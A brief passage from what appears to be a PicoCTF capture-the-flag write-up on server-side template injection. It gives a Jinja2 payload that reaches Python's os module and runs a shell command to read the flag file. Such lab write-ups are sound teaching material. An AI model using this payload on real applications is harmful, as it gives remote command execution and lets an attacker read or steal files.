



To test if there is an SSTI let's put this


![](../../../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260305132715.png)


```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}
```